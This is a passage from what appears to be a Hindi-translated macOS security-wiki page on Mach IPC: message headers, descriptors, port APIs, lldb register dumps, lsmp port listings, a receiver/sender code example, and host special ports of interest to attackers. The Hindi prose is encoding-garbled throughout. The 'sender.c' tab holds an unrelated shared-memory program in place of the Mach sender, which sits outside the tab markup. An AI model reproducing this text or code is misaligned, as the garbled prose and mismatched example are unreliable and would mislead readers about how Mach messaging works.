рдПрдХ рд╕рд░рд▓ **рджреНрд╡рд┐рджрд┐рд╢реАрдп рд╕рдВрдЪрд╛рд░** рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдорд╢реАрди **рд╕рдВрджреЗрд╢ рд╣реЗрдбрд░** рдореЗрдВ рдПрдХ **рдореИрдХ рдкреЛрд░реНрдЯ** рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреА рд╣реИ рдЬрд┐рд╕реЗ _рдЙрддреНрддрд░ рдкреЛрд░реНрдЯ_ (**`msgh_local_port`**) рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд╣рд╛рдВ рд╕рдВрджреЗрд╢ рдХрд╛ рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рдЗрд╕ рд╕рдВрджреЗрд╢ рдХрд╛ рдЙрддреНрддрд░ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИред

{% hint style="success" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рджреНрд╡рд┐рджрд┐рд╢реАрдп рд╕рдВрдЪрд╛рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХреНрд╕рдкреАрд╕реА рд╕рдВрджреЗрд╢реЛрдВ рдореЗрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рдПрдХ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреА рдЙрдореНрдореАрдж рд░рдЦрддреЗ рд╣реИрдВ (`xpc_connection_send_message_with_reply` рдФрд░ `xpc_connection_send_message_with_reply_sync`). рд▓реЗрдХрд┐рди **рдЖрдо рддреМрд░ рдкрд░ рд╡рд┐рднрд┐рдиреНрди рдкреЛрд░реНрдЯ рдмрдирд╛рдП рдЬрд╛рддреЗ рд╣реИрдВ** рдЬреИрд╕рд╛ рдкрд╣рд▓реЗ рд╕реНрдкрд╖реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рджреНрд╡рд┐рджрд┐рд╢реАрдп рд╕рдВрдЪрд╛рд░ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдПред
{% endhint %}

рд╕рдВрджреЗрд╢ рд╣реЗрдбрд░ рдХреЗ рдЕрдиреНрдп рдлрд╝реАрд▓реНрдб рд╣реИрдВ:

- `msgh_size`: рдкреВрд░реЗ рдкреИрдХреЗрдЯ рдХрд╛ рдЖрдХрд╛рд░ред
- `msgh_remote_port`: рдЬрд┐рд╕ рдкреЛрд░реНрдЯ рдкрд░ рдпрд╣ рд╕рдВрджреЗрд╢ рднреЗрдЬрд╛ рдЧрдпрд╛ рд╣реИред
- `msgh_voucher_port`: [рдореИрдХ рд╡рд╛рдЙрдЪрд░](https://robert.sesek.com/2023/6/mach\_vouchers.html)ред
- `msgh_id`: рдЗрд╕ рд╕рдВрджреЗрд╢ рдХрд╛ рдЖрдИрдбреА, рдЬрд┐рд╕реЗ рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдореИрдХ рд╕рдВрджреЗрд╢** рдПрдХ `рдореИрдХ рдкреЛрд░реНрдЯ` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВ, рдЬреЛ рдореИрдХ рдХрд░реНрдиреЗрд▓ рдореЗрдВ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рдПрдХ **рдПрдХрд▓ рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛**, **рдПрдХрд╛рдзрд┐рдХ рднреЗрдЬрдиреЗ рд╡рд╛рд▓рд╛** рд╕рдВрдЪрд╛рд░ рдЪреИрдирд▓ рд╣реИред **рдПрдХрд╛рдзрд┐рдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдБ** рдПрдХ рдореИрдХ рдкреЛрд░реНрдЯ рдкрд░ рд╕рдВрджреЗрд╢ рднреЗрдЬ рд╕рдХрддреА рд╣реИрдВ, рд▓реЗрдХрд┐рди рдХрд┐рд╕реА рднреА рд╕рдордп рдХреЗрд╡рд▓ **рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛** рдЗрд╕реЗ рдкрдврд╝ рд╕рдХрддреА рд╣реИред
{% endhint %}

рдЙрд╕рдХреЗ рдмрд╛рдж рд╕рдВрджреЗрд╢ **`mach_msg_header_t`** рд╣реЗрдбрд░ рджреНрд╡рд╛рд░рд╛ рдФрд░ **рдмреЙрдбреА** рджреНрд╡рд╛рд░рд╛ рдФрд░ **рдЯреНрд░реЗрд▓рд░** (рдпрджрд┐ рдХреЛрдИ рд╣реЛ) рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдП рдЬрд╛рддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ рдЙрддреНрддрд░ рджреЗрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддреЗ рд╣реИрдВред рдЗрди рдорд╛рдорд▓реЛрдВ рдореЗрдВ, рдХрд░реНрдиреЗрд▓ рдХреЛ рд╕рд┐рд░реНрдл рдПрдХ рдХрд╛рд░реНрдп рд╕реЗ рджреВрд╕рд░реЗ рдХрд╛рд░реНрдп рддрдХ рд╕рдВрджреЗрд╢ рдкрд╛рд╕ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред

рдПрдХ **рдЯреНрд░реЗрд▓рд░** рдПрдХ **рд╕рдВрджреЗрд╢ рдореЗрдВ рдХрд░реНрдиреЗрд▓ рджреНрд╡рд╛рд░рд╛ рдЬреЛрдбрд╝реА рдЧрдИ рдЬрд╛рдирдХрд╛рд░реА** рд╣реИ (рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рд╕реЗрдЯ рдирд╣реАрдВ рдХреА рдЬрд╛ рд╕рдХрддреА) рдЬрд┐рд╕реЗ рдлреНрд▓реИрдЧ `MACH_RCV_TRAILER_<trailer_opt>` рдХреЗ рд╕рд╛рде рд╕рдВрджреЗрд╢ рдкреНрд░рд╛рдкреНрддрд┐ рдореЗрдВ рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рдпрд╣рд╛рдВ рд╡рд┐рднрд┐рдиреНрди рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ)ред

#### рдЬрдЯрд┐рд▓ рд╕рдВрджреЗрд╢

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЕрдиреНрдп рдЕрдзрд┐рдХ **рдЬрдЯрд┐рд▓** рд╕рдВрджреЗрд╢ рд╣реИрдВ, рдЬреИрд╕реЗ рдЕрддрд┐рд░рд┐рдХреНрдд рдкреЛрд░реНрдЯ рдЕрдзрд┐рдХрд╛рд░ рдпрд╛ рд╕рд╛рдЭрд╛ рдореЗрдореЛрд░реА рдкрд╛рд╕ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ, рдЬрд╣рд╛рдВ рдХрд░реНрдиреЗрд▓ рдХреЛ рднреА рдЗрди рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рдХреЛ рднреЗрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд╣реЗрдбрд░ `msgh_bits` рдХрд╛ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдмрд┐рдЯ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрднрд╛рд╡рд┐рдд рд╡рд┐рд╡рд░рдг [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рд╣реИрдВ:
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
### Mac Ports APIs

рдиреЛрдЯ рдХрд░реЗрдВ рдХрд┐ рдкреЛрд░реНрдЯреНрд╕ рдХреЛ рдЯрд╛рд╕реНрдХ рдиреЗрдорд╕реНрдкреЗрд╕ рд╕реЗ рдЬреБрдбрд╝рд╛ рд╣реЛрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдкреЛрд░реНрдЯ рдмрдирд╛рдиреЗ рдпрд╛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП, рдЯрд╛рд╕реНрдХ рдиреЗрдорд╕реНрдкреЗрд╕ рднреА рдХреНрд╡реЗрд░реА рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА `mach/mach_port.h` рдореЗрдВ):

- **`mach_port_allocate` | `mach_port_construct`**: рдПрдХ рдкреЛрд░реНрдЯ рдмрдирд╛рдПрдВред
- `mach_port_allocate` рдПрдХ **рдкреЛрд░реНрдЯ рд╕реЗрдЯ** рднреА рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ: рдПрдХ рд╕рдореВрд╣ рдХреЗ рдкреЛрд░реНрдЯреНрд╕ рдкрд░ рдкреНрд░рд╛рдкреНрддрд┐ рдЕрдзрд┐рдХрд╛рд░ред рдЬрдм рдПрдХ рд╕рдВрджреЗрд╢ рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЗрд╕рдореЗрдВ рд╕рдВрдХреЗрддрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ рд╕рдВрджреЗрд╢ рдХрд┐рд╕ рдкреЛрд░реНрдЯ рд╕реЗ рдЖрдпрд╛ рд╣реИред
- `mach_port_allocate_name`: рдкреЛрд░реНрдЯ рдХрд╛ рдирд╛рдо рдмрджрд▓реЗрдВ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ 32 рдмрд┐рдЯ рдкреВрд░реНрдгрд╛рдВрдХ)
- `mach_port_names`: рдПрдХ рд▓рдХреНрд╖реНрдп рд╕реЗ рдкреЛрд░реНрдЯ рдирд╛рдо рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
- `mach_port_type`: рдПрдХ рдирд╛рдо рдкрд░ рдЯрд╛рд╕реНрдХ рдХреЗ рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
- `mach_port_rename`: рдПрдХ рдкреЛрд░реНрдЯ рдХрд╛ рдирд╛рдо рдмрджрд▓реЗрдВ (рдЬреИрд╕реЗ FDs рдХреЗ рд▓рд┐рдП dup2)
- `mach_port_allocate`: рдПрдХ рдирдпрд╛ рдкреНрд░рд╛рдкреНрддрд┐, рдкреЛрд░реНрдЯ рд╕реЗрдЯ рдпрд╛ DEAD_NAME рдЖрд╡рдВрдЯрд┐рдд рдХрд░реЗрдВ
- `mach_port_insert_right`: рдЙрд╕ рдкреЛрд░реНрдЯ рдореЗрдВ рдПрдХ рдирдпрд╛ рдЕрдзрд┐рдХрд╛рд░ рдмрдирд╛рдПрдВ рдЬрд┐рд╕ рдкрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ рдкреНрд░рд╛рдкреНрддрд┐ рд╣реИ
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: **mach рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдФрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдлрд╝рдВрдХреНрд╢рдиред рдУрд╡рд░рд░рд╛рдЗрдЯ рд╕рдВрд╕реНрдХрд░рдг рд╕рдВрджреЗрд╢ рдкреНрд░рд╛рдкреНрддрд┐ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд┐рднрд┐рдиреНрди рдмрдлрд╝рд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ (рджреВрд╕рд░рд╛ рд╕рдВрд╕реНрдХрд░рдг рдЗрд╕реЗ рдмрд╕ рдкреБрдирдГ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛)ред
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
рд╡рд┐рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рд╕реЗ рдорд╛рди рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
рдЬрд╛рдВрдЪреЗрдВ рд╕рдВрджреЗрд╢ рд╣реЗрдбрд░ рдФрд░ рдкрд╣рд▓реЗ рддрд░реНрдХ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
рдРрд╕реЗ рдкреНрд░рдХрд╛рд░ рдХрд╛ `mach_msg_bits_t` рдПрдХ рдЙрддреНрддрд░ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рд╕рд╛рдорд╛рдиреНрдп рд╣реИред



### рджреНрд╡рд╛рд░реЛрдВ рдХреА рдЧрдгрдирд╛
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**рдирд╛рдо** рдкреЛрд░реНрдЯ рдХрд╛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдирд╛рдо рд╣реИ (рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдкрд╣рд▓реЗ 3 рдмрд╛рдЗрдЯ рдореЗрдВ рдХреИрд╕реЗ **рдмрдврд╝ рд░рд╣рд╛** рд╣реИ)ред **`ipc-object`** рдкреЛрд░реНрдЯ рдХрд╛ **рдЕрд╡рд┐рд╡рд╛рджрд┐рдд** рдЕрджреНрд╡рд┐рддреАрдп **рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛** рд╣реИред
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХреЗрд╡рд▓ **`send`** рдЕрдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдкреЛрд░реНрдЯреНрд╕ рдореЗрдВ рдЗрд╕рдХреЗ рдорд╛рд▓рд┐рдХ рдХреА рдкрд╣рдЪрд╛рди рдХреИрд╕реЗ рд╣реЛ рд░рд╣реА рд╣реИ (рдкреЛрд░реНрдЯ рдирд╛рдо + pid)ред
рдпрд╣рд╛рдВ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **`+`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЙрд╕реА рдкреЛрд░реНрдЯ рд╕реЗ рдЬреБрдбрд╝реЗ рдЕрдиреНрдп рдХрд╛рд░реНрдпреЛрдВ** рдХреЛ рджрд░реНрд╢рд╛рдиреЗ рдХреЗ рд▓рд┐рдПред

[**procesxp**](https://www.newosxbook.com/tools/procexp.html) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рднреА **рдкрдВрдЬреАрдХреГрдд рд╕реЗрд╡рд╛ рдирд╛рдореЛрдВ** (SIP рдЕрдХреНрд╖рдо рд╣реЛрдиреЗ рдХреЗ рдХрд╛рд░рдг `com.apple.system-task-port` рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдиреЗ рдкрд░) рджреЗрдЦрдирд╛ рд╕рдВрднрд╡ рд╣реИ:
```
procesp 1 ports
```
рдЖрдк рдЗрд╕ рдЯреВрд▓ рдХреЛ iOS рдореЗрдВ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЗрд╕реЗ [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдХреЗред

### рдХреЛрдб рдЙрджрд╛рд╣рд░рдг

рдиреЛрдЯ рдХрд░реЗрдВ рдХрд┐ **рднреЗрдЬрдиреЗ рд╡рд╛рд▓рд╛** **рдПрдХ рдкреЛрд░реНрдЯ рдЖрд╡рдВрдЯрд┐рдд** рдХрд░рддрд╛ рд╣реИ, `org.darlinghq.example` рдирд╛рдо рдХреЗ рд▓рд┐рдП **рдПрдХ рднреЗрдЬрдиреЗ рдХрд╛ рд╣рдХ** рдмрдирд╛рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ **рдмреВрдЯрд╕реНрдЯреНрд░реИрдк рд╕рд░реНрд╡рд░** рдХреЛ рднреЗрдЬрддрд╛ рд╣реИ рдЬрдмрдХрд┐ рднреЗрдЬрдиреЗ рд╡рд╛рд▓рд╛ рдЙрд╕ рдирд╛рдо рдХреЗ **рднреЗрдЬрдиреЗ рдХрд╛ рд╣рдХ** рдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдз рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд░рддрд╛ рд╣реИред

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}  
### рднреЗрдЬрдиреЗ рд╡рд╛рд▓рд╛ рд╕реА

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/shm.h>

#define SHM_SIZE 1024

int main() {
    key_t key;
    int shmid;
    char *data;
    
    key = ftok("/tmp", 'a');
    shmid = shmget(key, SHM_SIZE, IPC_CREAT | 0666);
    data = shmat(shmid, NULL, 0);
    
    strcpy(data, "Hello, shared memory!");
    
    printf("Data sent: %s\n", data);
    
    shmdt(data);
    
    return 0;
}
```  
{% endtab %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

## рд╡рд┐рд╢реЗрд╖ рдмрдВрджрд░рдЧрд╛рд╣

рдХреБрдЫ рд╡рд┐рд╢реЗрд╖ рдмрдВрджрд░рдЧрд╛рд╣ рд╣реИрдВ рдЬреЛ рдХрд┐рд╕реА рдХрд╛рд░реНрдпреЛрдВ рдХреЛ **рдХреБрдЫ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░рдиреЗ рдпрд╛ рдХреБрдЫ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ рдпрджрд┐ рдХрд┐рд╕реА рдХрд╛рд░реНрдп рдХреЗ рдкрд╛рд╕ рдЙрди рдкрд░ **SEND** рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реЛрдВред рдЗрд╕рд╕реЗ рдЗрди рдмрдВрджрд░рдЧрд╛рд╣реЛрдВ рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреА рджреГрд╖реНрдЯрд┐ рд╕реЗ рдмрд╣реБрдд рджрд┐рд▓рдЪрд╕реНрдк рдмрдирд╛рддрд╛ рд╣реИ рди рдХреЗрд╡рд▓ рдХреНрд╖рдорддрд╛рдУрдВ рдХреЗ рдХрд╛рд░рдг рдмрд▓реНрдХрд┐ рдЗрд╕рд▓рд┐рдП рднреА рдХреНрдпреЛрдВрдХрд┐ **рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рдмреАрдЪ SEND рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╕рд╛рдЭрд╛ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ**ред

### рдореЗрдЬрдмрд╛рди рд╡рд┐рд╢реЗрд╖ рдмрдВрджрд░рдЧрд╛рд╣

рдпреЗ рдмрдВрджрд░рдЧрд╛рд╣ рдПрдХ рд╕рдВрдЦреНрдпрд╛ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рдд рд╣реЛрддреЗ рд╣реИрдВред

**SEND** рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **`host_get_special_port`** рдХреЛ рдмреБрд▓рд╛рдХрд░ рдФрд░ **RECEIVE** рдЕрдзрд┐рдХрд╛рд░ рдХреЛ **`host_set_special_port`** рдХреЛ рдмреБрд▓рд╛рдХрд░ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рджреЛрдиреЛрдВ рдХреЙрд▓реНрд╕ рдХреЛ **`host_priv`** рдмрдВрджрд░рдЧрд╛рд╣ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдЬрд┐рд╕рдХреЛ рдХреЗрд╡рд▓ рд░реВрдЯ рддрдХ рдкрд╣реБрдВрдЪ рд╣реЛрддреА рд╣реИред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдкрд┐рдЫрд▓реЗ рдореЗрдВ рд░реВрдЯ рдХреЛ **`host_set_special_port`** рдХреЛ рдмреБрд▓рд╛рдиреЗ рдФрд░ рдЕрд╡рд╢реЗрд╖ рдХреЛ рдЙрдбрд╝рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдереА рдЬрд┐рд╕рд╕реЗ рдХреЛрдб рд╣рд╕реНрддрд╛рдХреНрд╖рд░реЛрдВ рдХреЛ рдЙрд▓рдЯрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛ рд╕рдХрддреА рдереА рдЬреИрд╕реЗ рдХрд┐ `HOST_KEXTD_PORT` рдХреЛ рдЙрдбрд╝рд╛рдиреЗ рд╕реЗ (SIP рдЕрдм рдЗрд╕реЗ рд░реЛрдХрддрд╛ рд╣реИ)ред

